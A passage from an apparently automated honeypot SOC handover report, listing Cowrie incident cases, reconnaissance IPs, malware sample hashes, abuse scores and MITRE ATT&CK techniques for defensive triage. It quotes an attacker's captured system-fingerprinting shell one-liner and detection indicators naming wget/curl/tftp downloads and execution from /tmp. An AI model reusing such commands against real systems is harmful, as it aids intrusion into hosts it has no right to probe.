- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ebe70faa9a6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 20:12 |
| **Last Seen** | 2026-08-26 20:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 20:12:42` | `cowrie.session.connect` |
| `2026-08-26 20:12:44` | `cowrie.client.version` |
| `2026-08-26 20:12:44` | `cowrie.client.kex` |
| `2026-08-26 20:12:48` | `cowrie.login.success` |
| `2026-08-26 20:12:51` | `cowrie.session.params` |
| `2026-08-26 20:12:51` | `cowrie.command.input` |
| `2026-08-26 20:12:51` | `cowrie.command.input` |
| `2026-08-26 20:12:51` | `cowrie.command.input` |
| `2026-08-26 20:12:51` | `cowrie.command.input` |
| `2026-08-26 20:12:51` | `cowrie.command.input` |
| `2026-08-26 20:12:51` | `cowrie.command.success` |
| `2026-08-26 20:12:51` | `cowrie.command.input` |
| `2026-08-26 20:12:51` | `cowrie.command.input` |
| `2026-08-26 20:12:51` | `cowrie.command.input` |
| `2026-08-26 20:12:51` | `cowrie.command.input` |
| `2026-08-26 20:12:51` | `cowrie.log.closed` |
| `2026-08-26 20:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60c85e019064

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-26 20:35 |
| **Last Seen** | 2026-08-26 20:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 20:35:24` | `cowrie.session.connect` |
| `2026-08-26 20:35:24` | `cowrie.client.version` |
| `2026-08-26 20:35:24` | `cowrie.client.kex` |
| `2026-08-26 20:35:24` | `cowrie.login.success` |
| `2026-08-26 20:35:24` | `cowrie.direct-tcpip.request` |
| `2026-08-26 20:35:24` | `cowrie.direct-tcpip.data` |
| `2026-08-26 20:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `102.37.220[.]188` | **14** | 2026-08-26 18:59 | 2026-08-26 20:50 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-26 19:00 | 2026-08-26 20:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]229` | **3** | 2026-08-26 19:44 | 2026-08-26 19:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `176.215.19[.]8` | **3** | 2026-08-26 18:58 | 2026-08-26 19:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `186.137.20[.]23` | **3** | 2026-08-26 18:56 | 2026-08-26 18:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]184` | **3** | 2026-08-26 20:32 | 2026-08-26 20:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]173` | **3** | 2026-08-26 20:32 | 2026-08-26 20:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]103` | **3** | 2026-08-26 20:31 | 2026-08-26 20:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-08-26 19:00 | 2026-08-26 20:01 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `172.236.228[.]202` | **2** | 2026-08-26 19:08 | 2026-08-26 19:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `190.104.47[.]210` | **2** | 2026-08-26 20:39 | 2026-08-26 20:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | **2** | 2026-08-26 19:23 | 2026-08-26 19:33 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `200.59.89[.]168` | **2** | 2026-08-26 19:34 | 2026-08-26 20:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `220.168.118[.]133` | **2** | 2026-08-26 19:18 | 2026-08-26 19:20 | 2m | 0 | `T1592` | 🟢 LOW |
| `24.153.195[.]77` | **2** | 2026-08-26 20:54 | 2026-08-26 20:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.250.81[.]7` | **2** | 2026-08-26 20:28 | 2026-08-26 20:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.242.39[.]51` | 1 | 2026-08-26 20:38 | 2026-08-26 20:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-08-26 19:43 | 2026-08-26 19:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-08-26 20:35 | 2026-08-26 20:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]16` | 1 | 2026-08-26 19:21 | 2026-08-26 19:21 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `8.211.183[.]26` | JP | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 11 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `102.37.220[.]188` | ZA | Microsoft (S.A.) (Proprietary) Limited | **100** ⚠️ | 19 |
| `186.137.20[.]23` | AR | Telecom Argentina S.A. | **100** ⚠️ | 0 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `172.236.228[.]229` | US | Linode | **100** ⚠️ | 50 |
| `47.250.81[.]7` | MY | Alibaba Cloud - MY | **100** ⚠️ | 50 |
| `66.132.172[.]184` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 42 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 24 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 22 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 22 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 21 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 87 cases |
| Tool 34  | Credential Extractor        | ✅ 30 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (6.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 19 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 24 priority case(s) shown individually · 20 recon entry/entries in table (16 group(s) consolidating 53 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-26T22:56:37Z_
